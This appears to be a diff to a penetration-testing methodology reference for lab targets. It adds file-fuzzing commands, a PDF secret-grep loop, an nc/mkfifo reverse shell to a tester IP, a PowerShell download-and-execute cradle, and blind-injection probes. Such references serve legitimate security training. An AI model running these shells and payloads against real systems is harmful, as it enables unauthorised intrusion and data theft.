@@ -102,6 +102,14 @@ window.METHODOLOGY = {
             { tool: "feroxbuster", cmd: "feroxbuster -u {target_url} -w {wordlist} -x php,txt,bak,zip,old,inc" },
             { tool: "curl",        cmd: "curl -s {target_url}/robots.txt; curl -s {target_url}/sitemap.xml" }
           ] },
+        { label: "Hunt data-bearing files (not just dirs)", sev: "high",
+          tell: "local.txt / creds / a hidden link often live INSIDE a served file — a PDF, doc, backup, or a numbered report — not behind a directory. Fuzz filenames + extensions, then actually read what you find.",
+          cmds: [
+            { tool: "ext sweep", cmd: "ffuf -u {target_url}/FUZZ -w {wordlist} -e .pdf,.txt,.md,.csv,.xlsx,.docx,.bak,.old,.zip,.sql,.conf,.config -mc 200,301,302 -c -t 50" },
+            { tool: "numeric names", cmd: "ffuf -u {target_url}/data/FUZZ -w /usr/share/seclists/Fuzzing/5-digits-00000-99999.txt -e .txt,.pdf -mc 200 -c   # reports/invoices/screenshots are often <id>.<ext>" },
+            { tool: "read PDFs/docs", cmd: "for f in *.pdf; do echo \"== $f\"; pdftotext \"$f\" -; done | grep -iE 'http|pass|key|token|user|flag'   # links + secrets hide in the text" },
+            { note: true, tool: "then", cmd: "A link/endpoint found in a PDF or doc is the next step. Diff a found backup (.bak/.old/source) against the live app for creds and hidden paths." }
+          ] },
         { label: "Read every client-side JS file", sev: "high",
           tell: "Static JS holds the API map: paths, exact field names, JSON vs form, hidden functions, debug flags, keys. Pull source maps if present.",
           cmds: [
@@ -827,6 +835,15 @@ window.METHODOLOGY = {
           cmds: [
             { note: true, tool: "catcher", cmd: "Run scripts/catch-server.py {tester_port} and aim ANY of these at it: SQLi/cmdi OAST, blind XSS beacon, SSRF fetch, XXE OOB. A single hit confirms the bug." },
             { tool: "time-probe", cmd: "# generic time oracle — if the response hangs ~5s, you have blind injection:  ;sleep 5  |  ' AND SLEEP(5)-- -  |  {{range(10000000)}}" }
+          ] },
+        { label: "Shell won't land / wrong OS", sev: "high",
+          tell: "A reverse shell that dies usually means the interpreter you assumed isn't there (busybox / no-bash box) or you're on Windows. Enumerate what exists first, then pick a shell that matches — or skip the shell and just read the file.",
+          cmds: [
+            { tool: "what's installed (Linux)", cmd: "which python3 python perl nc busybox bash sh 2>/dev/null; ls /bin /usr/bin 2>/dev/null | grep -E '^(nc|python|perl|busybox|socat)'" },
+            { note: true, tool: "no bash?", cmd: "Minimal/busybox box: drop 'bash', use sh. nc without -e: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {tester_ip} {tester_port} >/tmp/f. Or a python3 one-liner — see the Reverse Shells tab." },
+            { tool: "Windows? enumerate", cmd: "whoami & ver & where /r C:\\ powershell.exe python.exe 2>nul" },
+            { note: true, tool: "Windows RCE", cmd: "PowerShell download-exec: powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://{tester_ip}:{tester_port}/s.ps1')\" — host s.ps1 with a TCP revshell (Reverse Shells tab → powershell). Or certutil / nc.exe to pull a binary." },
+            { note: true, tool: "skip the shell", cmd: "A file-read primitive often reaches proof without any shell — Linux: /root/proof.txt, /home/*/{local,proof}.txt. Windows: type C:\\proof.txt, C:\\Users\\*\\Desktop\\proof.txt (locate with: dir C:\\ /s /b proof.txt)." }
           ] },
         { label: "Reset and pivot",
           tell: "When you've truly exhausted a path.",
